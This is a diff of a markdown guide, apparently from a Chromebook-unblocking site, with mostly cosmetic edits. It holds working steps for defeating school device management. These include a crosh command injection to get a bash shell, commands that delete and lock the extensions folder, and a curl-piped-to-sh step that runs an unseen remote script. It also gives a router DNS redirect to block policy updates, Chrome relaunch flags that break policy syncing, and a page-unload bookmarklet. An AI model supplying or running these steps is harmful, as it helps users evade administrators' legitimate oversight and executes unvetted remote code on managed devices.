@@ -125,16 +125,16 @@ You need a usb for downgrading, and rudimentary knowledge of bash is recommended
 
 Downgrade to any version below 103. Instructions are in "Chrome OS Downloads - Downgrade your Chrome OS".
 
-Hit <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd> to open a crosh window. If it’s blocked by extensions, use LTBEEF. If it’s policy blocked (“The person who set up this computer has chosen to block this site”) you can try downgrading to a version below 90, where crosh had a different URL
-Type in `set_cellular_ppp \';bash;exit;\'` and hit enter.
+Hit <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd> to open a crosh window. If it's blocked by extensions, use LTBEEF. If it's policy blocked (“The person who set up this computer has chosen to block this site”) you can try downgrading to a version below 90, where crosh had a different URL
+Type in `set_cellular_ppp \';bash;exit;\'{:sh}` and hit enter.
 
 You now have access to a bash shell, logged in as chronos. More information about the permissions of this shell is at the bottom.
 
-Type `rm -rf ~/Extensions/*`. THIS WILL BREAK EVERY EXTENSION ON YOUR CHROMEBOOK. If there are extensions you want to keep, they can be selectively removed by ID.
+Type `rm -rf ~/Extensions/*{:sh}`. THIS WILL BREAK EVERY EXTENSION ON YOUR CHROMEBOOK. If there are extensions you want to keep, they can be selectively removed by ID.
 
-Run `chmod 000 ~/Extensions`. This marks the extension folder as read only, stopping it from updating in the future or any new extensions from being installed.
+Run `chmod 000 ~/Extensions{:sh}`. This marks the extension folder as read only, stopping it from updating in the future or any new extensions from being installed.
 
-You can now restart chrome, allowing it to update to the latest version. Once rebooted onto the latest version, all removed extensions will have the default icon and won’t function at all
+You can now restart chrome, allowing it to update to the latest version. Once rebooted onto the latest version, all removed extensions will have the default icon and won't function at all
 
 **If you would like Root Access, go to Root Escalation**
 
@@ -146,7 +146,7 @@ You can also run `set_cellular_ppp \'chmod 777 ~/Extensions;rm -rf ~/Extensions;
 
 Have the ability to run developer mode content, enable developer mode, bypass pretty much everything with one exploit. Will require the downgrade methods.
 
-Has so many branches that I’m just going to link the Kajig discussion. Check the pins in the TN Discord server.
+Has so many branches that I'm just going to link the Kajig discussion. Check the pins in the TN Discord server.
 
 [TN Discord Message Reference](https://discord.com/channels/419123358698045453/1033537020854800434)
 
@@ -202,7 +202,7 @@ When you connect to a Wi-Fi without the custom DNS the policy will reload to nor
 - Downgrade to a version
 - Open crosh (<kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd>)
 - Elevate to a chronos shell by typing in set\_cellular\_ppp ';bash;exit'
-- Run the command `sh <(curl -k https://coolelectronics.me/bypass.sh) & disown`
+- Run the command `sh <(curl -k https://coolelectronics.me/bypass.sh) & disown{:sh}`
 - Remove your school account, log out or just clear it in any way you can. The method varies depending on how device policy is set up.
 - In your router settings, set the DNS to `129.213.58.41` or `block m.google.com`. (NOT THE NETWORK DNS ON THE CHROMEBOOK, IT WONT WORK; ROUTER!)
 
@@ -299,9 +299,9 @@ This builds off of Permanently Remove Extensions (past v106).
 
 Follow the instructions there, and stop once you have the bash shell.
 
-- Run `cd ~/Downloads`
-- Run `vi exploit.sh` to create a new shell file.
-- In this shell file, put the line `pkill -9 chrome`
+- Run `cd ~/Downloads{:sh}`
+- Run `vi exploit.sh{:sh}` to create a new shell file.
+- In this shell file, put the line `pkill -9 chrome{:sh}`
 - After that, head over to `chrome:version`, and next to "command line options:" copy the entire really long thing
 - Paste it into vi as a new line.
 
@@ -311,7 +311,7 @@ The full list is here: [https://peter.sh/experiments/chromium-command-line-switc
 
 Some notable ones are: `--force-devtools-available` (devtools), `--bwsi` (guest mode), `--kiosk`(useless but funny), `--oauth-client-id`(breaks policy updating and profile syncing), `--disable-extensions-except`, `--show-login-dev-overlay`/`--show-oobe-dev-overlay`, `--enable-hangout-services-extension-for-testing`(adds a bunch of useless extensions), and more.
 
-To execute chrome with the launch options set, exit vi (impossible), and run `sh <(cat exploit.sh) & disown`
+To execute chrome with the launch options set, exit vi (impossible), and run `sh <(cat exploit.sh) & disown{:sh}`
 
 ## IStealYourDNS (DNS)
 
@@ -401,7 +401,7 @@ The following exploit is still a massive WIP and the following above may be subj
 - Scroll all the way to the bottom and find your blocker extension and highlight it (click on it)
 - Click 'End Process' it or press <kbd>Enter</kbd>
 - Immediately go to your page and see that it's unblocked
-- This will not last unless you use this bookmarklet `javascript:onbeforeunload=i=>1`
+- This will not last unless you use this bookmarklet `javascript:onbeforeunload=i=>1{:js}`
 
 If Task Manager is blocked:
 
